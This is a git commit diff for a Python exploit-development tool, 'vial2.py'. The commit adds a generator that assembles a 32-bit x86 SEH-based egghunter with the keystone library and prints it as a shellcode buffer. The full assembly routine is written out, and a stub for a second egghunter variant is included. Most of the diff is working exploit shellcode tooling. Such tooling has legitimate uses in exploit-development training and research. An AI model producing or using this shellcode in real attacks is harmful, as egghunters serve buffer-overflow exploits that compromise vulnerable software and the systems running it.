36d1f7979bd89f15b64189fcb9062bf71bb25c87
codemuch <eric@codemuch.net>
2023-02-23 22:05:35 -0800

    SEH shellcode

--- vial2.py
+++ vial2.py
@@ -2,6 +2,7 @@
 
 import argparse
 import sys
+from keystone import *
 from rich.console import Console
 
 BANNER = '''[green]
@@ -12,7 +13,6 @@ Y88b      / 888      e      888
     Y8/     888  /____Y88b  888     
      Y      888 /      Y88b 888____
 [/green]'''
-
 DEFAULT_TAG = 'y0y0'
 
 def tag_to_hex(s):
@@ -22,12 +22,66 @@ def tag_to_hex(s):
         tag = DEFAULT_TAG
     return f"0x{''.join([hex(ord(ch)).split('x')[1] for ch in tag][::-1])}"
 
+def print_shellcode(code):
+    ks = Ks(KS_ARCH_X86, KS_MODE_32)
+    encoding, count = ks.asm(code)
+    print("Encoded %d instructions..." % count)
+
+    shellcode = ""
+    for dec in encoding: 
+        shellcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
+    print("buf = (\"" + shellcode + "\")")
+
+def generate_egghunter_seh(tag):
+    egg_hunter = f'''
+        start: 									 
+            jmp get_seh_address 				;
+        build_exception_record: 				
+            pop ecx 							;
+            mov eax, {tag_to_hex(tag)} 	;
+            push ecx 							;
+            push 0xffffffff 					;
+            xor ebx, ebx 						;
+            mov dword ptr fs:[ebx], esp 		;
+            sub ecx, 0x04						;
+            add ebx, 0x04						;
+            mov dword ptr fs:[ebx], ecx			;
+        is_egg: 								
+            push 0x02 							;
+            pop ecx 							;
+            mov edi, ebx 						;
+            repe scasd 							;
+            jnz loop_inc_one 					;
+            jmp edi 							;
+        loop_inc_page: 							 
+            or bx, 0xfff 						;
+        loop_inc_one: 							 
+            inc ebx 							;
+            jmp is_egg 							;
+        get_seh_address: 						
+            call build_exception_record 		;
+            push 0x0c 							;
+            pop ecx 							;
+            mov eax, [esp+ecx] 					;
+            mov cl, 0xb8						;
+            add dword ptr ds:[eax+ecx], 0x06	;
+            pop eax 							;
+            add esp, 0x10 						;
+            push eax 							;
+            xor eax, eax 						;
+            ret 								; 
+    '''
+    print_shellcode(egg_hunter)
+
+def generate_egghunter_ntaccess(tag):
+    pass
+
 def main(args):
     console = Console()
     console.print(BANNER)
 
     if args.egghunter:
-        tag = args.tag
+        tag = args.tag 
 
         if len(tag) != 4:
             tag = DEFAULT_TAG
@@ -35,6 +89,7 @@ def main(args):
             console.print(f"[INFO] Using default tag {tag}")
 
         console.print(f"[INFO] Generating egghunter with tag {tag_to_hex(tag)} ({tag})")
+        generate_egghunter_seh(tag)
 
 if __name__ == '__main__':
 
@@ -66,7 +121,10 @@ if __name__ == '__main__':
 
     parser.add_argument(
         '--tag',
-        help = f"Egghunter tag to use (default: {DEFAULT_TAG})"
+        help = f"Egghunter tag to use (default: {DEFAULT_TAG})",
+        action = 'store',
+        type = str,
+        default = DEFAULT_TAG
     )
 
     if len(sys.argv) > 1:
